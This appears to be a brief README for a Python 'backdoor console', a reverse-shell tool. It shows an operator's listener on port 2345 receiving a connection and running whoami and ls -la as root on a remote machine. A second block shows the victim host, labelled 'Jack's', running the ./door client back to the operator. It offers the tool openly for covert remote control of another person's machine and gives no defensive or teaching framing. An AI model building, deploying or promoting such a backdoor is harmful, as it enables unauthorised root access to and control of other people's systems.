> A simple Backdoor CONSOLE, Support both Python 2 & 3.

### Your side
```
root@server 07:47 /home # ./server 0.0.0.0:2345
listen on 0.0.0.0:2345, waiting for connection.
connection from *.*.*.*:49006
$> whoami
root

$> ls -la
total 16
drwxr-xr-x  3 root root 4096 Feb 11 07:31 .
drwxr-xr-x 22 root root 4096 Jan 30 09:55 ..
-rwxr-xr-x  1 root root  532 Feb 11 07:31 door
drwxr-xr-x  5 git  git  4096 Jan  3 08:41 jack

$>
```

### Jack's
```
root@boy 07:47 /home # ./door *.*.*.*:2345
```
End.
